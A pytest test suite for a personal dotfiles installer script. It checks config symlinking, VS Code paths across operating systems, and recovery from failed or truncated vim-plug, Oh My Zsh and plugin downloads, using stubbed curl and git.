        assert (saved / "my-own-skill/SKILL.md").read_text(
            encoding="utf-8"
        ) == "user authored\n"
        assert (saved / ".system/SKILL.md").read_text(
            encoding="utf-8"
        ) == "codex managed\n"

    def test_shared_codex_skills_resolve_to_claude_sources(self, shell_env):
        # The shared set lives in the repo tree (.codex/skills/<name> ->
        # ../../.claude/skills/<name>), not in an install.sh array. Every entry
        # must resolve to a real skill: a dangling link deploys a skill Codex
        # cannot read, and nothing in install.sh would catch that.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        shared = [p for p in (REPO_ROOT / ".codex/skills").iterdir() if p.is_symlink()]
        assert shared, "expected .codex/skills to hold symlinks into .claude/skills"
        for link in shared:
            target = link.resolve()
            assert target.is_dir(), f"{link.name} is dangling: {target}"
            assert target.parent == (REPO_ROOT / ".claude/skills").resolve(), (
                f"{link.name} points outside .claude/skills: {target}"
            )
            assert (target / "SKILL.md").is_file(), f"{link.name} has no SKILL.md"
            # And it is reachable through the deployed link, as Codex sees it.
            assert (home / ".codex/skills" / link.name / "SKILL.md").is_file()

    def test_links_vscode_configs_on_linux(self, shell_env):
        # No OS set (mirrors "no OS var in the ambient test env"): the
        # non-macos / Linux-style ~/.config destinations must be used.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        vscode_user = home / ".config/Code/User"
        for name in ("settings.json", "keybindings.json"):
            code_link = vscode_user / name
            assert code_link.is_symlink(), f"Code {name} should be linked"
            assert (
                code_link.resolve()
                == (REPO_ROOT / ".config/Code/User" / name).resolve()
            )

    def test_links_vscode_configs_on_macos(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        env = dict(shell_env.env)
        env["OS"] = "macos"

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        vscode_user = home / "Library/Application Support/Code/User"
        for name in ("settings.json", "keybindings.json"):
            assert (vscode_user / name).is_symlink()

    def test_links_vscode_configs_on_windows(self, shell_env):
        """detect_os yields "windows" for msys/cygwin, and that branch was missing.

        VS Code on Windows reads user settings from %APPDATA%\\Code\\User. The function
        only distinguished macOS from "everything else", so a Git Bash install landed
        them under $HOME/.config/Code/User, where the Windows build never looks -- the
        symlinks were created and had no effect. Not verified against a real Windows VS
        Code from here; this pins the path the branch is supposed to produce.
        """
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        appdata = home / "AppData/Roaming"
        appdata.mkdir(parents=True)
        env = dict(shell_env.env)
        env["OS"] = "windows"
        env["APPDATA"] = str(appdata)

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        vscode_user = appdata / "Code/User"
        for name in ("settings.json", "keybindings.json"):
            assert (vscode_user / name).is_symlink(), (
                f"{name} was not linked under %APPDATA%/Code/User"
            )

    def test_windows_without_appdata_falls_back_rather_than_failing(self, shell_env):
        """Git Bash normally exports APPDATA, but a bare msys shell may not.

        Falling back to the Linux-style path keeps the installer from aborting under
        `set -u`; it is the same place the pre-fix code always used, so this is a
        degradation, not a regression.
        """
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        env = dict(shell_env.env)
        env["OS"] = "windows"
        env.pop("APPDATA", None)

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr
        assert (home / ".config/Code/User/settings.json").is_symlink()


class TestInstallAiTools:
    def test_skips_prompt_when_non_interactive(self, shell_env):
        # Piped/CI runs have no TTY on stdin. A bare `read` returns non-zero at
        # EOF and, under `set -e`, would abort the whole installer before the
        # later steps (MCP registration, shell change). The function must skip
        # cleanly and return 0 instead of aborting.
        res = run_sourced('install_ai_tools </dev/null; echo "RC=$?"', shell_env.env)
        assert "RC=0" in res.stdout, res.stdout + res.stderr
        assert "Non-interactive" in res.stdout
        assert "Do you want to install" not in res.stdout


class TestInstallVimPlugins:
    """`vim +PlugInstall +qall || true` used to swallow vim being absent
    (exit 127) the same as a real PlugInstall failure, then printed
    print_success unconditionally either way."""

    def test_missing_vim_warns_and_skips(self, shell_env):
        # macOS ships its own /usr/bin/vim alongside a homebrew one, so a
        # PATH strip can't make `vim` genuinely unresolvable without also
        # taking dirname/touch/sudo (also under /usr/bin) down with it.
        # Shadow `vim` as a function instead (blocks the old code's direct
        # invocation too, so a real vim is never spawned either way) and
        # make command_exists agree it is absent (drives the new guard).
        res = run_sourced(
            "vim() { return 127; }; "
            'command_exists() { [ "$1" = "vim" ] && return 1 '
            '|| command -v "$1" >/dev/null 2>&1; }; '
            'install_vim_plugins; echo "AFTER_VIM_PLUGINS"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_VIM_PLUGINS" in res.stdout
        assert "[WARNING]" in res.stdout
        assert "Vim plugins installed" not in res.stdout

    def test_plug_install_failure_warns_instead_of_claiming_success(self, shell_env):
        shell_env.stub("vim", exit_code=1)
        res = run_sourced(
            'install_vim_plugins; echo "AFTER_VIM_PLUGINS"', shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_VIM_PLUGINS" in res.stdout
        assert "[WARNING]" in res.stdout
        assert "Vim plugins installed" not in res.stdout

    def test_successful_plug_install_prints_success(self, shell_env):
        shell_env.stub("vim")
        res = run_sourced(
            'install_vim_plugins; echo "AFTER_VIM_PLUGINS"', shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert "Vim plugins installed" in res.stdout


# `curl -o` streams into its target, so a connection dropped mid-transfer leaves a
# partial plug.vim behind rather than nothing. That is the whole bug: the existence
# check below the download then reports success over the corpse, and -- worse -- the
# `[ ! -f ]` guard above it makes every future run skip the download entirely, so no
# rerun of install.sh ever repairs it. fetch_and_run (used for every other download in
# this file) already refuses truncated and empty bodies; install_vim_plug never got that
# treatment, and had no test of any kind.
_CURL_TRUNCATED = """
for arg in "$@"; do
  if [ "$prev" = "-fLo" ]; then mkdir -p "$(dirname "$arg")"; printf 'partial' > "$arg"; fi
  prev="$arg"
done
exit 1
"""


class TestInstallVimPlug:
    def test_truncated_download_is_not_reported_as_success(self, shell_env):
        shell_env.stub("curl", body=_CURL_TRUNCATED)
        res = run_sourced('install_vim_plug; echo "AFTER"', shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "AFTER" in res.stdout
        assert "[WARNING]" in res.stdout
        assert "vim-plug installed" not in res.stdout, (
            "a failed download printed success because the partial file exists"
        )

    def test_a_failed_download_leaves_nothing_behind_so_a_rerun_retries(
        self, shell_env
    ):
        """The sticky half: a corpse on disk disables the retry path forever."""
        shell_env.stub("curl", body=_CURL_TRUNCATED)
        run_sourced("install_vim_plug", shell_env.env)
        plug = shell_env.home / ".vim/autoload/plug.vim"
        assert not plug.exists(), (
            "a failed download left a partial plug.vim, so `[ ! -f ]` will skip "
            "the download on every future run and the corruption is permanent"
        )

    def test_a_successful_download_is_kept_and_reported(self, shell_env):
        shell_env.stub(
            "curl",
            body=(
                'for arg in "$@"; do\n'
                '  if [ "$prev" = "-fLo" ]; then mkdir -p "$(dirname "$arg")"; '
                'printf \'" real plug.vim\\n\' > "$arg"; fi\n'
                '  prev="$arg"\n'
                "done\n"
            ),
        )
        res = run_sourced("install_vim_plug", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "vim-plug installed" in res.stdout
        assert (shell_env.home / ".vim/autoload/plug.vim").exists()

    def test_an_existing_plug_vim_is_not_redownloaded(self, shell_env):
        plug = shell_env.home / ".vim/autoload/plug.vim"
        plug.parent.mkdir(parents=True)
        plug.write_text('" already here\n', encoding="utf-8")
        shell_env.stub("curl", exit_code=1)
        res = run_sourced("install_vim_plug", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "vim-plug installed" in res.stdout
        assert plug.read_text(encoding="utf-8") == '" already here\n'


class TestOptionalEntryLoopsDoNotAbortTheInstaller:
    """A missing OPTIONAL entry must not take the whole installer down.

    Each `_link_*_config` used to walk an array and link the entries that
    exist with:

        for entry in "${entries[@]}"; do
          [ -e "$DOTFILES_DIR/.x/$entry" ] && link_entry ...
        done

    The `[ -e ]` guard was there precisely to tolerate an absent entry -- and
    it did, for every element except the LAST. When the final element was
    missing, `&&` short-circuited, the for-loop's exit status was that of the
    failed test, and because the loop was the function's last command the
    function returned 1. Under `set -eo pipefail` (install.sh:14) that killed
    the run, and main() exited 1 having printed NO error at all: a silent,
    unexplained failure in the middle of an install.

    That `&&` form is gone now -- each `_link_*_config` uses
    `if [ -e ... ]; then link_entry ...; fi` instead, which does not carry a
    missing last entry's failed test into the loop's exit status. This test
    pins that fix against a regression back to the `&&` form.

    Reachable from a sparse/partial clone, a zip export, a user who deleted the
    Gemini config -- or simply from someone appending a new optional entry to
    one of these arrays later.
    """

    @pytest.mark.parametrize(
        ("fn", "subdir", "entries"),
        [
            ("_link_claude_config", ".claude", ["CLAUDE.md", "skills"]),
            ("_link_codex_config", ".codex", ["AGENTS.md", "skills"]),
            ("_link_gemini_config", ".gemini", ["GEMINI.md", "settings.json"]),
        ],
    )
    def test_missing_last_entry_still_returns_success(
        self, shell_env, tmp_path, fn, subdir, entries
    ):
        # A checkout that has the FIRST entry but not the LAST.
        fake_repo = tmp_path / "fake-dotfiles"
        (fake_repo / subdir).mkdir(parents=True)
        (fake_repo / subdir / entries[0]).write_text("x\n", encoding="utf-8")
        assert not (fake_repo / subdir / entries[-1]).exists()

        env = {**shell_env.env, "DRY_RUN": "0"}
        res = run_sourced(
            f'DOTFILES_DIR="{fake_repo}"; {fn}; echo "RC=$?"; echo REACHED_NEXT_LINE',
            env,
        )

        assert "RC=0" in res.stdout, (
            f"{fn} returned non-zero because its last optional entry was "
            f"missing:\nstdout={res.stdout!r}\nstderr={res.stderr!r}"
        )
        assert "REACHED_NEXT_LINE" in res.stdout, (
            f"set -e killed the script after {fn} -- silently, with no error "
            f"message:\nstdout={res.stdout!r}\nstderr={res.stderr!r}"
        )
        # The entry that IS present must still have been linked.
        assert (shell_env.home / subdir / entries[0]).is_symlink()

    @pytest.mark.parametrize(
        ("fn", "subdir", "entry"),
        [
            ("_link_claude_config", ".claude", "CLAUDE.md"),
            ("_link_codex_config", ".codex", "AGENTS.md"),
            ("_link_gemini_config", ".gemini", "GEMINI.md"),
        ],
    )
    def test_a_real_link_failure_still_propagates(
        self, shell_env, tmp_path, fn, subdir, entry
    ):
        # The fix must not turn into a blanket `|| true`: if link_entry itself
        # fails, that is a genuine error and has to keep aborting.
        fake_repo = tmp_path / "fake-dotfiles"
        (fake_repo / subdir).mkdir(parents=True)
        (fake_repo / subdir / entry).write_text("x\n", encoding="utf-8")

        env = {**shell_env.env, "DRY_RUN": "0"}
        res = run_sourced(
            f'DOTFILES_DIR="{fake_repo}"\n'
            "link_entry() { return 3; }\n"
            f'{fn}; echo "RC=$?"',
            env,
        )
        assert "RC=0" not in res.stdout, (
            f"{fn} swallowed a real link_entry failure: {res.stdout!r}"
        )


class TestCodexConfigWithoutACodexTree:
    """_link_codex_config must survive a checkout that has no .codex at all.

    Its entry loop is written with `if [ -e "$DOTFILES_DIR/.codex/$entry" ]`
    precisely so a missing entry is skipped rather than fatal. But the
    resolution right below it,
    `codex_repo_real="$(cd "$DOTFILES_DIR/.codex" && pwd -P)"`, carried
    neither the `2>/dev/null` nor the `|| var=""` that both of its siblings
    have (the ~/.codex probe on the line above, and the ~/.config pair in
    _render_git_local_config). With .codex absent the cd fails, `set -e`
    takes the whole installer down mid-way, and the run ends with the
    top-level dotfiles and .claude linked, no [ERROR] line, and no hint that
    anything was skipped.
    """

    def test_missing_codex_tree_is_skipped_not_fatal(self, shell_env, tmp_path):
        fake_repo = tmp_path / "fake-dotfiles"
        fake_repo.mkdir()
        assert not (fake_repo / ".codex").exists()

        env = {**shell_env.env, "DRY_RUN": "0"}
        res = run_sourced(
            f'DOTFILES_DIR="{fake_repo}"; _link_codex_config; echo "RC=$?"; '
            "echo REACHED_NEXT_LINE",
            env,
        )
        assert "RC=0" in res.stdout, (
            "_link_codex_config failed on a checkout without .codex:\n"
            f"stdout={res.stdout!r}\nstderr={res.stderr!r}"
        )
        assert "REACHED_NEXT_LINE" in res.stdout, (
            "set -e killed the installer after _link_codex_config, silently:\n"
            f"stdout={res.stdout!r}\nstderr={res.stderr!r}"
        )


class TestStrictMode:
    def test_pipefail_enabled(self, shell_env):
        # Pipelines like `curl ... | sudo tee` must not swallow curl's exit
        # status. Test the actual behavior (not `set -o` text) so it stays
        # meaningful even if the option is enabled a different way.
        res = run_sourced(
            "if false | true; then echo RESULT=swallowed; "
            "else echo RESULT=pipefail-detected; fi",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "RESULT=pipefail-detected" in res.stdout


# Simulates `git clone URL DEST` closely enough for the rerun tests above and
# below to mean anything. Two behaviours are copied from real git:
#
#   1. it REFUSES a DEST that already exists and is not empty -- "fatal:
#      destination path ... already exists and is not an empty directory",
#      exit 128. An existing but EMPTY DEST is accepted, which is why
#      reclaim_aborted_clone only has to empty a directory, never remove it;
#   2. a successful clone leaves the plugin's own files behind, not merely the
#      directory. The earlier stub ran `mkdir -p DEST` and nothing else, so
#      every test that re-ran an installer was asserting against a state no
#      real clone ever produces -- which is exactly the blind spot that let a
#      guard keyed on the DIRECTORY look idempotent in tests while wedging on
#      a real machine.
#
# DEST's own basename plus a `.zsh` sibling covers all three clone sites
# (tpm/tpm, zsh-autosuggestions/zsh-autosuggestions.zsh,
# zsh-syntax-highlighting/zsh-syntax-highlighting.zsh); the one extra file per
# site is inert. README.md stands in for "a checkout has top-level files", the
# property that tells a real checkout apart from an interrupted clone.
_GIT_CLONE_STUB = r"""
if [ "$1" = "clone" ]; then
  dest="${@: -1}"
  if [ -d "$dest" ] && [ -n "$(find "$dest" -mindepth 1 -maxdepth 1)" ]; then
    echo "fatal: destination path '$dest' already exists and is not an empty directory." >&2
    exit 128
  fi
  mkdir -p "$dest/.git"
  name="$(basename "$dest")"
  : >"$dest/$name"
  chmod +x "$dest/$name"
  : >"$dest/$name.zsh"
  : >"$dest/README.md"
fi
"""


class TestInstallOhMyZsh:
    def _stub_git_clone(self, shell_env):
        shell_env.stub("git", body=_GIT_CLONE_STUB)

    def _mark_omz_installed(self, home):
        """Make install_oh_my_zsh consider Oh My Zsh already present.

        It tests for the oh-my-zsh.sh entry point rather than the directory,
        because create_symlinks now runs first and creates
        ~/.oh-my-zsh/custom/themes/ to land the theme -- a directory test would
        skip the install forever. These tests cover the custom/ handling, not
        the download, so short-circuit the install the same way a real machine
        with Oh My Zsh already on it would.
        """
        omz = home / ".oh-my-zsh"
        omz.mkdir(exist_ok=True)
        (omz / "oh-my-zsh.sh").write_text("# stub entry point\n", encoding="utf-8")

    def test_heals_symlinked_custom_dir_before_cloning_plugins(
        self, shell_env, tmp_path
    ):
        # A previous buggy install symlinked $HOME/.oh-my-zsh/custom straight
        # into the dotfiles checkout, which only ships themes/ (no plugins/).
        # install_oh_my_zsh must convert it back to a real directory BEFORE
        # cloning plugins, or the clone lands inside the checkout.
        self._stub_git_clone(shell_env)
        home = shell_env.home
        self._mark_omz_installed(home)
        fake_dotfiles_custom = tmp_path / "fake-dotfiles" / ".oh-my-zsh" / "custom"
        (fake_dotfiles_custom / "themes").mkdir(parents=True)
        (home / ".oh-my-zsh/custom").symlink_to(fake_dotfiles_custom)

        res = run_sourced("install_oh_my_zsh", shell_env.env)
        assert res.returncode == 0, res.stderr

        custom = home / ".oh-my-zsh/custom"
        assert not custom.is_symlink()
        assert custom.is_dir()
        assert (custom / "plugins/zsh-autosuggestions").is_dir()
        assert (custom / "plugins/zsh-syntax-highlighting").is_dir()
        # The clone must never have landed inside the (simulated) checkout.
        assert not (fake_dotfiles_custom / "plugins").exists()

    def test_rerun_does_not_reclone_existing_plugins(self, shell_env):
        self._stub_git_clone(shell_env)
        home = shell_env.home
        self._mark_omz_installed(home)

        first = run_sourced("install_oh_my_zsh", shell_env.env)
        assert first.returncode == 0, first.stderr
        clone_calls_1 = [c for c in shell_env.calls if c.startswith("git clone")]

        second = run_sourced("install_oh_my_zsh", shell_env.env)
        assert second.returncode == 0, second.stderr
        clone_calls_2 = [c for c in shell_env.calls if c.startswith("git clone")]

        assert clone_calls_2 == clone_calls_1
        assert not (home / ".oh-my-zsh/custom").is_symlink()


# Simulates Oh My Zsh's own official installer. Two behaviours matter here and
# both are copied from the real tools/install.sh:
#
#   1. it refuses to run when $ZSH (~/.oh-my-zsh) already exists;
#   2. setup_zshrc moves an existing ~/.zshrc aside to ~/.zshrc.pre-oh-my-zsh
#      and writes its own template in its place. Its guard is
#      `[ -f "$zdot/.zshrc" ] || [ -h "$zdot/.zshrc" ]`, so a SYMLINK trips it
#      too, and `--unattended` alone does not suppress it -- that flag sets
#      RUNZSH / CHSH / OVERWRITE_CONFIRMATION but leaves KEEP_ZSHRC at its `no`
#      default, which merely makes the clobber silent. Only `--keep-zshrc`
#      stops it.
#
# Simplified deliberately: the real setup_zshrc also writes its template when
# no ~/.zshrc existed at all (the write sits outside the clobber guard). No
# test here reaches that path -- create_symlinks always runs first and leaves
# a symlink behind -- so the stub only models the clobber branch.
#
# Written to curl's `-o` target so fetch_and_run executes it in place of a real
# download; the installer body therefore receives install.sh's own flags in
# "$@" (see fetch_and_run's `sh <tmp> --unattended ...` form).
_OMZ_OFFICIAL_INSTALLER_STUB = r"""
out=""; prev=""
for a in "$@"; do
  [ "$prev" = "-o" ] && out="$a"
  prev="$a"
done
if [ -n "$out" ]; then
  cat > "$out" <<'INSTALLER'
if [ -d "$HOME/.oh-my-zsh" ]; then
  echo "Oh My Zsh already installed (stub)" >&2
  exit 1
fi
mkdir -p "$HOME/.oh-my-zsh"
echo "# stub entry point" > "$HOME/.oh-my-zsh/oh-my-zsh.sh"

keep_zshrc=no
for a in "$@"; do
  [ "$a" = "--keep-zshrc" ] && keep_zshrc=yes
done
# setup_zshrc: -f OR -h, so a symlink counts as "an existing zshrc".
if [ "$keep_zshrc" = no ] && { [ -f "$HOME/.zshrc" ] || [ -h "$HOME/.zshrc" ]; }; then
  mv "$HOME/.zshrc" "$HOME/.zshrc.pre-oh-my-zsh"
  echo "# oh-my-zsh default template (stub)" > "$HOME/.zshrc"
fi
INSTALLER
fi
"""


class TestOhMyZshFreshInstallOrdering:
    """A true first-ever install must not abort under set -eo pipefail.

    Bug: create_symlinks used to `mkdir -p "$HOME/.oh-my-zsh/custom/themes"`
    to land the theme symlink, which -- on a machine with no prior Oh My Zsh
    -- created $HOME/.oh-my-zsh as a real directory before Oh My Zsh's own
    installer ever ran. The official installer refuses to run when $ZSH
    already exists, so install_oh_my_zsh's unguarded fetch_and_run call
    returned non-zero and set -eo pipefail took the whole script down. The
    theme-linking block is now its own function (link_oh_my_zsh_theme),
    called from main() only after install_oh_my_zsh.
    """

    def _stub_git_clone(self, shell_env):
        shell_env.stub("git", body=_GIT_CLONE_STUB)

    def test_fresh_install_succeeds_and_still_links_the_theme(self, shell_env):
        shell_env.stub("curl", body=_OMZ_OFFICIAL_INSTALLER_STUB)
        self._stub_git_clone(shell_env)
        home = shell_env.home
        assert not (home / ".oh-my-zsh").exists()  # genuinely fresh machine

        res = run_sourced(
            "create_symlinks && install_oh_my_zsh && link_oh_my_zsh_theme",
            shell_env.env,
        )
        assert res.returncode == 0, res.stdout + res.stderr

        assert (home / ".oh-my-zsh/oh-my-zsh.sh").is_file()
        theme_link = home / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme"
        assert theme_link.is_symlink()
        assert (
            theme_link.resolve()
            == (REPO_ROOT / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme").resolve()
        )

    def test_fresh_install_keeps_the_zshrc_symlink_create_symlinks_just_made(
        self, shell_env
    ):
        """Oh My Zsh must not be allowed to clobber our ~/.zshrc symlink.

        main() runs create_symlinks BEFORE install_oh_my_zsh, so on a genuinely
        fresh machine ~/.zshrc is already a symlink into the checkout by the
        time Oh My Zsh's installer runs. setup_zshrc's guard is `-f OR -h`, so
        it treats that symlink as "an existing zshrc", moves it to
        ~/.zshrc.pre-oh-my-zsh and drops its own template in its place --
        silently, because --unattended suppressed the confirmation prompt
        without setting KEEP_ZSHRC.

        The install then reports success while none of the repo's zsh config is
        live: no aliases, no PATH, no plugin list, no ~/.zsh_secrets sourcing,
        no px-rose-pine theme. Only a second full run repairs it (Oh My Zsh
        short-circuits on oh-my-zsh.sh, create_symlinks relinks), which is
        exactly why this went unnoticed.
        """
        shell_env.stub("curl", body=_OMZ_OFFICIAL_INSTALLER_STUB)
        self._stub_git_clone(shell_env)
        home = shell_env.home
        assert not (home / ".oh-my-zsh").exists()  # genuinely fresh machine

        res = run_sourced("create_symlinks && install_oh_my_zsh", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr

        zshrc = home / ".zshrc"
        assert zshrc.is_symlink(), (
            "Oh My Zsh replaced the ~/.zshrc symlink with its own template; "
            "pass --keep-zshrc to its installer"
        )
        assert zshrc.resolve() == (REPO_ROOT / ".zshrc").resolve()
        assert not (home / ".zshrc.pre-oh-my-zsh").exists()

    def test_create_symlinks_alone_does_not_create_oh_my_zsh_dir(self, shell_env):
        # The root cause, isolated: create_symlinks must not touch
        # ~/.oh-my-zsh at all on a fresh machine -- that is now entirely
        # link_oh_my_zsh_theme's job, run after install_oh_my_zsh.
        home = shell_env.home
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert not (home / ".oh-my-zsh").exists()


class TestOhMyZshFetchFailureIsRecoverable:
    """A failed Oh My Zsh download must stay recoverable on the next run.

    Bug: install_oh_my_zsh warned and continued past a failed fetch_and_run
    (correct -- one optional component must not stop the run), but everything
    after the failure branch treated $ZSH as if it existed:
    `mkdir -p ~/.oh-my-zsh/custom`, the two plugin clones under it, and the
    `mkdir -p ~/.oh-my-zsh/custom/themes` that main() reaches later via
    link_oh_my_zsh_theme. Any one of them materialises $HOME/.oh-my-zsh.

    Oh My Zsh's own installer refuses to run when $ZSH already exists (see
    _OMZ_OFFICIAL_INSTALLER_STUB), so that leftover directory made the
    failure permanent: every later ./install.sh reprinted the same warning
    and never installed. change_shell has meanwhile made zsh the login shell,
    so `source $ZSH/oh-my-zsh.sh` in .zshrc fails on every login -- no theme,
    no plugins, no completions -- and only `rm -rf ~/.oh-my-zsh` repairs it.
    """

    def _stub_git_clone(self, shell_env):
        shell_env.stub("git", body=_GIT_CLONE_STUB)

    def test_failed_fetch_leaves_nothing_behind_so_a_later_run_installs(
        self, shell_env
    ):
        """The two-stage regression: fail, then retry in the SAME $HOME.

        Stage 2 is the half that matters. Asserting only "mkdir was not
        called" would miss link_oh_my_zsh_theme's own mkdir; asserting that a
        subsequent honest run actually installs Oh My Zsh cannot be satisfied
        by any path that left $ZSH behind.
        """
        self._stub_git_clone(shell_env)
        home = shell_env.home

        # Stage 1: the download fails (transient network / DNS / proxy).
        shell_env.stub("curl", exit_code=1)
        first = run_sourced("install_oh_my_zsh; link_oh_my_zsh_theme", shell_env.env)
        assert first.returncode == 0, first.stdout + first.stderr
        assert "[WARNING]" in first.stdout
        assert not (home / ".oh-my-zsh").exists(), (
            "a failed download left $HOME/.oh-my-zsh behind; Oh My Zsh's "
            "installer refuses to run when $ZSH exists, so no later run can "
            "ever install it"
        )

        # Stage 2: same machine, same $HOME, network back.
        shell_env.stub("curl", body=_OMZ_OFFICIAL_INSTALLER_STUB)
        second = run_sourced("install_oh_my_zsh; link_oh_my_zsh_theme", shell_env.env)
        assert second.returncode == 0, second.stdout + second.stderr
        assert (home / ".oh-my-zsh/oh-my-zsh.sh").is_file(), (
            "the retry did not install Oh My Zsh: the first failure is permanent"
        )
        assert "Oh My Zsh installed" in second.stdout
        assert (home / ".oh-my-zsh/custom/plugins/zsh-autosuggestions").is_dir()
        assert (home / ".oh-my-zsh/custom/plugins/zsh-syntax-highlighting").is_dir()
        theme_link = home / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme"
        assert theme_link.is_symlink()
        assert (
            theme_link.resolve()
            == (REPO_ROOT / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme").resolve()
        )

    def test_main_call_order_after_a_failed_fetch_creates_no_oh_my_zsh_dir(
        self, shell_env
    ):
        """main() runs link_oh_my_zsh_theme after install_oh_my_zsh.

        Sequenced with `;`, not `&&`: the theme link must still be attempted
        after the failure (that is main()'s real order), and `&&` would skip
        it and pass for the wrong reason. The AFTER_* markers prove both
        functions actually ran.
        """
        self._stub_git_clone(shell_env)
        shell_env.stub("curl", exit_code=1)
        home = shell_env.home

        res = run_sourced(
            "install_oh_my_zsh; echo AFTER_OMZ; link_oh_my_zsh_theme; echo AFTER_THEME",
            shell_env.env,
        )

        assert res.returncode == 0, res.stdout + res.stderr
        assert "AFTER_OMZ" in res.stdout
        assert "AFTER_THEME" in res.stdout
        assert not (home / ".oh-my-zsh").exists(), (
            "link_oh_my_zsh_theme materialised $HOME/.oh-my-zsh after "
            "install_oh_my_zsh had already failed"
        )

    def test_failed_fetch_clones_no_plugins_and_claims_no_plugin_success(
        self, shell_env
    ):
        # Cloning into $ZSH is one of the ways the directory gets created, and
        # a plugin under a non-existent Oh My Zsh is dead weight either way.
        self._stub_git_clone(shell_env)
        shell_env.stub("curl", exit_code=1)

        res = run_sourced('install_oh_my_zsh; echo "AFTER_OMZ"', shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        # Still the house rule: one optional component must not stop the run.
        assert "AFTER_OMZ" in res.stdout
        assert [c for c in shell_env.calls if c.startswith("git clone")] == []
        assert "zsh plugins installed" not in res.stdout

    def test_half_made_zsh_dir_is_left_alone_and_gains_no_plugins(self, shell_env):
        """A $ZSH directory with no entry point is "not installed" -- and not
        ours to delete.

        This is the state machines poisoned by the old bug are already in, and
        it is also what an installer killed mid-run leaves. install_oh_my_zsh
        must treat it as absent (no plugin clones, no success claim) so the
        next run still sees work to do, while leaving whatever the user has
        under it untouched: recovering by `rm -rf`-ing a directory that may
        hold their own custom/ files is the user's call, not the script's.
        """
        self._stub_git_clone(shell_env)
        shell_env.stub("curl", exit_code=1)
        home = shell_env.home
        (home / ".oh-my-zsh/custom").mkdir(parents=True)
        mine = home / ".oh-my-zsh/custom/mine.zsh"
        mine.write_text("# hand-written\n", encoding="utf-8")

        res = run_sourced('install_oh_my_zsh; echo "AFTER_OMZ"', shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "AFTER_OMZ" in res.stdout
        assert "zsh plugins installed" not in res.stdout
        assert [c for c in shell_env.calls if c.startswith("git clone")] == []
        assert mine.read_text(encoding="utf-8") == "# hand-written\n"

    def test_successful_fetch_still_creates_custom_plugins_and_themes(self, shell_env):
        # Regression guard on the happy path: the new guards must not skip the
        # work they are guarding when Oh My Zsh really did install.
        self._stub_git_clone(shell_env)
        shell_env.stub("curl", body=_OMZ_OFFICIAL_INSTALLER_STUB)
        home = shell_env.home

        res = run_sourced("install_oh_my_zsh; link_oh_my_zsh_theme", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "zsh plugins installed" in res.stdout
        assert (home / ".oh-my-zsh/custom/plugins/zsh-autosuggestions").is_dir()
        assert (home / ".oh-my-zsh/custom/plugins/zsh-syntax-highlighting").is_dir()
        assert (home / ".oh-my-zsh/custom/themes").is_dir()
        assert not (home / ".oh-my-zsh/custom").is_symlink()

    def test_theme_link_still_runs_when_oh_my_zsh_was_already_installed(
        self, shell_env
    ):
        # The guard keys on the directory, not on this run's outcome: a
        # machine that already had Oh My Zsh must keep getting its theme.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        res = run_sourced("link_oh_my_zsh_theme", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        theme_link = home / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme"
        assert theme_link.is_symlink()

    def test_dry_run_theme_preview_is_unchanged_on_a_machine_without_omz(
        self, shell_env
    ):
        # link_oh_my_zsh_theme's guard is deliberately gated on DRY_RUN=0:
        # dry-run writes nothing, so it can never materialise $ZSH, and the
        # preview must keep listing the theme it would link.
        home = shell_env.home

        res = run_sourced("DRY_RUN=1 link_oh_my_zsh_theme", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "[DRY-RUN] would link" in res.stdout
        assert "px-rose-pine.zsh-theme" in res.stdout
        assert not (home / ".oh-my-zsh").exists()


class TestInterruptedCloneIsRetried:
    """A hard-interrupted `git clone` must not wedge every later run.

    install.sh clones three plugins whose guards all tested the TARGET
    DIRECTORY: tpm, zsh-autosuggestions, zsh-syntax-highlighting. An ordinary
    clone failure (bad URL, no DNS) is invisible to such a guard, because git
    removes the directory it created on its way out. A HARD interrupt does
    not: SIGKILL, an OOM kill, or the laptop suspending mid-fetch leaves the
    target behind holding nothing but the half-written `.git` that git lays
    down first.

    From then on `[ -d ... ]` reported "already installed" and the clone was
    never retried, while `.tmux.conf`'s `run '~/.tmux/plugins/tpm/tpm'` and
    .zshrc's plugin list kept sourcing files that were never fetched. Only a
    manual `rm -rf` repaired it -- the same shape commit 5236098 fixed for Oh
    My Zsh by keying the guard on the ENTRY POINT instead, which was never
    propagated to these three siblings.

    The load-bearing assertion here is that the entry point EXISTS after the
    run, not merely that `git clone` was called: a guard-only fix still calls
    clone, git refuses the non-empty directory (exit 128), and for tpm
    try_install swallows that into a tidy warning -- leaving the machine just
    as wedged with a greener-looking log.
    """

    TPM = ".tmux/plugins/tpm"
    AUTOSUGGESTIONS = ".oh-my-zsh/custom/plugins/zsh-autosuggestions"
    SYNTAX = ".oh-my-zsh/custom/plugins/zsh-syntax-highlighting"

    def _stub_git_clone(self, shell_env):
        shell_env.stub("git", body=_GIT_CLONE_STUB)

